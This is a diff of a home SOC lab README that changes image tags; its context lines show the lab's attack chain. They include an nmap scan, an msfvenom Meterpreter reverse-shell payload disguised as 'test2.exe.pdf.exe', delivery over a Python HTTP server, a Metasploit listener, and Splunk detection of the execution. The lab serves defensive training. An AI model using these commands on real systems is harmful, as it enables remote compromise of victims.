@@ -22,7 +22,7 @@ A hands-on home SOC lab simulating real-world cyber attacks using Kali Linux and
 
 This lab environment consists of a Kali Linux attacker machine and a Windows VM running Splunk and Sysmon for monitoring, connected through an isolated VirtualBox internal network.
 
-![SOC Lab Architecture](screenshots/network.png)
+<img src="screenshots/network.png" alt="lab architecture" width="500"/>
 
 ---
 
@@ -44,20 +44,20 @@ This lab environment consists of a Kali Linux attacker machine and a Windows VM 
 nmap -A 192.168.0.153 -Pn
 
 ```
-![Recon](screenshots/Recon.png)
+<img src="screenshots/Recon.png" alt="Recon" width="500"/>
 
 ### 2. Payload Generation (MSFVenom)
 ```bash
 msfvenom -p windows/x64/meterpreter_reverse_tcp \
   LHOST=192.168.0.152 LPORT=4444 -f exe -o test2.exe.pdf.exe
 ```
-![virus](screenshots/6.png)
+<img src="screenshots/6.png" alt="virus" width="500"/>
 
 ### 3. Payload Delivery (Python HTTP Server)
 ```bash
 python3 -m http.server 9999
 ```
-![payload ](screenshots/8.png)
+<img src="screenshots/8.png" alt="Payload" width="500"/>
 > Victim downloads `test2.exe.pdf.exe` via browser from `http://192.168.0.152:9999`
 
 ### 4. Listener & Shell
@@ -68,7 +68,7 @@ set PAYLOAD windows/x64/meterpreter_reverse_tcp
 set LHOST 192.168.0.152
 exploit
 ```
-![shell](screenshots/7.png)
+<img src="screenshots/7.png" alt="shell" width="500"/>
 > ✅ **Meterpreter session opened: `192.168.0.152:4444 → 192.168.0.153:55532`**
 
 ### 5. Verification (on victim)
@@ -76,7 +76,7 @@ exploit
 netstat -anob | findstr 4444
 # TCP 192.168.0.153:53060  192.168.0.152:4444  ESTABLISHED
 ```
-![listening](screenshots/11.png)
+<img src="screenshots/11.png" alt="listening" width="500"/>
 
 ---
 
@@ -86,7 +86,7 @@ Sysmon logs forwarded to Splunk Enterprise via `inputs.conf` → `index=endpoint
 ```spl
 index="endpoint" test2.pdf.exe
 ```
-![logs](screenshots/16.png)
+<img src="screenshots/16.png" alt="logs" width="500"/>
 > 4 events returned — process execution, parent process (`Explorer.EXE`), SHA256 hash, and user logged
 
 ---
